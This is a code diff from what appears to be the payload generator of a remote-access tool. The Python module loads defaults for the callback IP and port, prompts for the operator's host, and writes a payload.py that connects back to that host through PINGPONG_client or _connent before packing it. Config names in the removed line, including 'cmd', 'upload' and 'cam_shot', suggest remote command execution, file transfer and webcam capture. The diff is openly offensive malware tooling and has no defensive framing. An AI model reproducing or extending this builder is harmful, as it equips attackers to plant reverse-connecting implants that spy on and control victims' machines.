@@ -10,7 +10,7 @@ from random import randint
 install_path = path[4]
 path.append("..")
 import main, config_set
-config_list = ['Default_ip', 'Default_port', 'cmd', 'upload', 'cam_shot', 'priv_vbp_listen']
+config_list = ['Default_ip', 'Default_port', 'usage']
 #加载默认设置
 def load_config(config_list, payload_d):
     local_var = globals()
@@ -27,9 +27,19 @@ def generate_random_str(randomlength=16):
 	return random_str
 #打包
 def pack(payload, printf, upx_command, is_ask=True):
+	glo = globals()
 	main.print_normal("payload>[*]Loading settings......")
 	payload_d = main.get_value('payload')
 	load_config(config_list, payload_d)
+	for key in usage.keys():
+		value = usage[key]
+		if value == '1':
+			value = True
+		elif value == '0':
+			value = False
+		else:
+			main.print_error(f"payload>[-]datas error, cannot read data:{key}")
+		glo[key] = value
 	main.print_normal('payload>[*]Loading Done')
 	if is_ask:
 		ip = input(f"payload>[*]Please input the ip of your host(blank for {Default_ip})>")
@@ -76,16 +86,16 @@ def pack(payload, printf, upx_command, is_ask=True):
 			with open("./payload/payload.py", "w+", encoding="utf8") as a:
 					a.write(pay)
 					a.write(f"""
-	if __name__ == '__main__':
-		PINGPONG_client("{ip}", {port})""")
+if __name__ == '__main__':
+	PINGPONG_client("{ip}", {port})""")
 		else:
 			with open("./payload/_basic_conn.py", "r", encoding="utf8") as p:
 				pay = p.read()
 			with open("./payload/payload.py", "w+", encoding="utf8") as a:
 					a.write(pay)
 					a.write(f"""
-	if __name__ == '__main__':
-		_connent("{ip}", {port})""")
+if __name__ == '__main__':
+	_connent("{ip}", {port})""")
 		try:
 			system(command)
 			if printf:
